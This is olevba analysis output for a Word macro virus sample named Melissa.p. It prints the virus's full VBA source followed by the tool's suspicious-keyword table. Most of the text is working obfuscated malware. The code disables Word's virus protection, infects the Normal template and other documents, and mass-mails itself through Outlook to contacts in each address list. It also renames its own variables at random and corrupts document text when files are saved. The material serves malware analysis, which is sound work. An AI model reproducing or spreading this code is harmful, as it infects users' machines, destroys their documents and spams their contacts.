olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.p-76724531daadd008602da0a1335ed270b05b99de
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.p-76724531daadd008602da0a1335ed270b05b99de - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
K44 = Chr(69) + Chr(99) + Chr(108) + Chr(105) + Chr(112) + Chr(115) + Chr(101)
If System.ProfileString("", K44) = Empty Then System.ProfileString("", K44) = Str(0)
If ActiveDocument.Words.Count <= 5 Then Exit Sub
With ActiveDocument.VBProject.VBComponents
H865 = .Item(1).CodeModule.CountOfLines
If Left(.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set D778 = .Item(1)
F421 = True
System.ProfileString("", K44) = Str(Val(System.ProfileString("", K44)) + 1)
End If
End With
With NormalTemplate.VBProject.VBComponents
K766 = .Item(1).CodeModule.CountOfLines
If Left(.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set D778 = .Item(1)
C625 = True
System.ProfileString("", K44) = Str(Val(System.ProfileString("", K44)) + 1)
Call P103_D186
End If
End With
If C625 <> True And F421 <> True Then GoTo R445
If C625 = True Then D778.CodeModule.AddFromString (Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41) & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, H865 - 1))
If F421 = True Then D778.CodeModule.AddFromString (Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41) & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, K766 - 1))
R445:
If Val(System.ProfileString("", K44)) = 5 Then
Dim R39, Q43, B864, N842, F120
Set R39 = CreateObject(Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110))
Set Q43 = R39.GetNameSpace("MAPI")
If R39 = "Outlook" Then
    With ActiveDocument
    If .Saved = False Then
        .Save
        If .Saved = False Then Exit Sub
    End If
    End With
    Q43.Logon Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101), Chr(112) + Chr(97) + Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100)
    For Y = 1 To Q43.AddressLists.Count
        Set V422 = Q43.AddressLists(Y)
        x = 1
        Set B864 = R39.CreateItem(0)
        For oo = 1 To V422.AddressEntries.Count
            N842 = V422.AddressEntries(x)
            B864.Recipients.Add N842
            x = x + 1
            If x > 50 Then oo = V422.AddressEntries.Count
         Next oo
         B864.Subject = Chr(77) + Chr(101) + Chr(115) + Chr(115) + Chr(97) + Chr(103) + Chr(101) + Chr(32) + Chr(70) + Chr(114) + Chr(111) + Chr(109) + Chr(32) & Application.UserName
         B864.Body = Chr(72) + Chr(101) + Chr(114) + Chr(101) + Chr(32) + Chr(105) + Chr(115) + Chr(32) + Chr(116) + Chr(104) + Chr(97) + Chr(116) + Chr(32) + Chr(100) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(32) + Chr(121) + Chr(111) + Chr(117) + Chr(32) + Chr(97) + Chr(115) + Chr(107) + Chr(101) + Chr(100) + Chr(32) + Chr(102) + Chr(111) + Chr(114) + Chr(46) + Chr(32) + Chr(32) + Chr(72) + Chr(111) + Chr(112) + Chr(101) + Chr(32) + Chr(121) + Chr(111) + Chr(117) + Chr(32) + Chr(101) + Chr(110) + Chr(106) + Chr(111) + Chr(121) + Chr(32) + Chr(105) + Chr(116) + Chr(32) + Chr(59) + Chr(45) + Chr(41)
         B864.Attachments.Add ActiveDocument.FullName
         B864.Send
         N842 = ""
         Next Y
    Q43.Logoff
    R39.Application.Quit
    R39 = Nothing
  End If
End If
If K766 <> 0 And H865 = 0 Then
    If ActiveDocument.Saved = False Then
        ActiveDocument.Save
    End If
End If
End Sub

'Sub ToolsMacro()
'Q183
'End Sub

'Sub ViewVBCode()
'Q183
'End Sub

'Sub FileTemplates()
'Q183
'End Sub

Private Sub Q183()
msg = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(32) + Chr(104) + Chr(97) + Chr(115) + Chr(32) + Chr(112) + Chr(101) + Chr(114) + Chr(102) + Chr(111) + Chr(114) + Chr(109) + Chr(101) + Chr(100) + Chr(32) + Chr(97) + Chr(110) + Chr(32) + Chr(105) + Chr(108) + Chr(108) + Chr(101) + Chr(103) + Chr(97) + Chr(108) + Chr(32) + Chr(111) + Chr(112) + Chr(101) + Chr(114) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(97) + Chr(110) + Chr(100) + Chr(32) + Chr(119) + Chr(105) + Chr(108) + Chr(108) + Chr(32) + Chr(115) + Chr(104) + Chr(117) + Chr(116) + Chr(32) + Chr(100) + Chr(111) + Chr(119) + Chr(110) + Chr(46)
MsgBox msg, vbCritical, Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(87) + Chr(111) + Chr(114) + Chr(100)
End Sub

Private Sub P103_D186()
On Error Resume Next
Randomize Timer
Dim M457(0 To 24) As String
M457(0) = "M457"
M457(1) = "C731": M457(2) = "R879": M457(3) = "A828": M457(4) = "J447": M457(5) = "D186": M457(6) = "H865"
M457(7) = "K766": M457(8) = "F421":: M457(9) = "D778": M457(10) = "C625": M457(11) = "R445": M457(12) = "P103": M457(13) = "L17": M457(14) = "V733"
M457(15) = "R39": M457(16) = "Q43": M457(17) = "B864": M457(18) = "N842": M457(19) = "V422": M457(20) = "F120": M457(21) = "N233": M457(22) = "Q183"
M457(23) = "D673": M457(24) = "K44"
For x = 0 To 24
a1 = (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 1000)
Call D186(a1, M457(x))
Next x
End Sub

Private Sub D186(V733, L17 As String)
On Error Resume Next
Dim C731 As Long: Dim R879 As Long: Dim A828 As Long: Dim J447 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
C731 = 1: R879 = 1: A828 = .CountOfLines: J447 = Len(.Lines(.CountOfLines, 1))
Do While .Find(L17, C731, R879, A828, J447, True)
strline = .Lines(C731, 1)
strline = Left(strline, R879 - 1) & V733 & Mid(strline, J447)
.ReplaceLine C731, strline
C731 = A828 + 1: R879 = 1: DD2134 = .CountOfLines
J447 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
If ActiveDocument.Words.Count <= 5 And Day(Now()) <> 13 Then Exit Sub
Set N233 = ActiveDocument.Content
With N233.Find
    .ClearFormatting
    .Replacement.ClearFormatting
    .MatchWholeWord = True
    .Execute FindText:=".", ReplaceWith:=",", Replace:=wdReplaceAll
    .Execute FindText:="a", ReplaceWith:="e", Replace:=wdReplaceAll
    .Execute FindText:="and", ReplaceWith:="not", Replace:=wdReplaceAll
End With
msg = vbCrLf + Chr(89) + Chr(111) + Chr(117) + Chr(39) + Chr(118) + Chr(101) + Chr(32) + Chr(98) + Chr(101) + Chr(101) + Chr(110) + Chr(32) + Chr(69) + Chr(99) + Chr(108) + Chr(105) + Chr(112) + Chr(115) + Chr(101) + Chr(100) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(77) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(33) + Chr(77) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126)
msg = msg + vbCrLf + Chr(126) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126)
Set myR = ActiveDocument.Range(ActiveDocument.Content.End - 1, ActiveDocument.Content.End)
myR.InsertAfter msg
myR.Font.Name = "Courier New"
ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |?]7                 |P103                                         |
|String    |                    |                                             |
|Base64    |C_7                 |Q183                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

